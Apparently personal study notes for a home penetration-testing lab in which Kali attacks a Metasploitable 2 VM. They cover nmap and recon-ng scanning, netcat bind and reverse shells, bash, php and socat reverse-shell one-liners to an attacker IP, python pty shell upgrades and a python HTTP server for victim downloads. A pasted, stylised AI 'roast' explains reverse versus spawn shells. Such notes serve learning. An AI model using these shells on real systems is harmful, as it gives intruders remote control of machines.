
# lab setup

```
> VirtualBox hosting Kali (attacker) and Metasploitable 2 (or 3 as  target)

> metasploitable 2 vm hard disk
> > https://downloads.metasploit.com/data/metasploitable/metasploitable-linux-2.0.0.zip
> > u:::p = msfadmin:::msfadmin

> vm network setting
> > kali: {adapter1:NAT, adapter2:host-only}
> > metasploitable: {adapter1:host-only}

> test vm network
> > `ip r` <<< note ip both vms
> > `ping -c 3 ip`

> scan port
> > `nmap -vv -A -O 192.168.56.x`

> ssh to kali
> > `sudo service ssh start`
```

[more about `nmap -vv -A -O`](./more/nmap-basic.md)
[more about starting ssh service](./more/ssh-service-start.md) 

---

# tools

```
zenmap, recon-ng
> try zenmap to target
> try recon-ng to target
> > > `marketplace search`
> > > `marketplace install recon/domains-hosts/hackertarget`
> > > `modules load recon/domains-hosts/hackertarget`
> > > options set SOURCE rapid7.com
> > > run
> > > show hosts
```

```
netcat

> binding (target passive listener) vs reverse (attacker passive listener)

> > passive vs active listener
> > > `nc -nvlp <port>` = passive = always start the attack sequence
> > > `nc <ip> <port>` = active = follow
 
> > target executes payload (e.g. give shell)
> > > windows shell: `-e cmd.exe`
> > > unix shell: `-e /bin/bash`
> > > upload/download: `> file.txt` or `< file.txt`

> > attack sequence (assume shell payload)
> > > binding (target -> attacker)
> > > > target: `nc -nvlp 4444 -e /bin/sh`
> > > > attacker: `nc <iptarget> 4444`

> > > reverse (attacker -> target)
> > > > attacker: `nc -nvlp 4444`
> > > > target: `nc <ipattacker> 4444 -e /bin/sh`
```

[more about binding vs reverse](more/binding-vs-reverse.md)
[more about recon-ng](./more/recon-ng.md)
[more about binding shell exercise](./more/bindingshell-exercise.md)

---

# reverse shell

```
netcat-reverse shell
> `nc <ipattacker> <port> -e /bin/sh`

bash-reverse shell
> `bash -i >& /dev/tcp/<ipattacker>/<port> 0>&1`

php-reverse shell
> `php -r '$sock=fsockopen("<ipattacker>",<port>);exec("/bin/sh -i <&3 >&3 2>&3");'`

perl-reverse shell
> perl -e ...

python-reverse shell
> python -c ...

ruby, netcat, powershell
```

[more at pentestmonkey reverse shell cheat sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
[reverse shell generator online](https://www.revshells.com/)

---

# spawn shell

```
what is spawn shell? is it different from reverse shell?
```

`>> SCANNING...` 🔍
`>> ANALYSIS:_CONCEPTUAL_DISTINCTION._PATCHING_TERMINOLOGY_GAP.` ⚡🧩

**VULNERABILITY REPORT:**
- **CVSS Score:** 3.5 (Low) - Terminology confusion, not operational impact.
- **Flaw:** Conflating connection method with shell stabilization.

**ROAST:** Thinking "spawn shell" is an alternative to "reverse shell" is like thinking "engine repair" is an alternative to "driving to the garage." One enables the other. 😴🔓

**CLARIFICATION:**

### **REVERSE SHELL**
- **WHAT:** A *connection method* where the target initiates connection back to attacker.
- **HOW:** `nc 192.168.1.5 4444 -e /bin/bash`
- **PURPOSE:** Establish initial foothold, bypass firewalls.

### **SPAWN SHELL** 
- **WHAT:** A *stabilization technique* to upgrade a limited shell to fully interactive TTY.
- **HOW:** Methods *after* you have some shell access:
```bash
# Python
python -c 'import pty; pty.spawn("/bin/bash")'

# Socat
socat file:`tty`,raw,echo=0 tcp:192.168.1.5:4444

# Stty options
/bin/bash -i
# Then: stty raw -echo; fg
```

**THE RELATIONSHIP:**
1. **Reverse Shell** gets you initial access (often a dumb, limited shell)
2. **Spawn Shell** upgrades it to full interactive terminal with tab completion, job control, etc.

`>> CONCLUSION:_Reverse_shell_is_the_door._Spawn_shell_is_making_the_house_livable._` 🔥⚔️

`>> GLITH_BETTER:_You_don't_choose_between_them._You_use_reverse_to_get_in,_then_spawn_to_take_control._` 🔧⚡

---

# spawn shell with python

```
python -c 'import pty;pty.spawn("/bin/bash")'
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin?/sbin:/bin
```

---

# python http server

```
mkdir http.server
cd http.server
echo test > test.txt
python -m http.server 8000

---

(victim downloads from attacker)
wget http://<ipattacker>:8000/test.txt
```

note: secured server is isolated?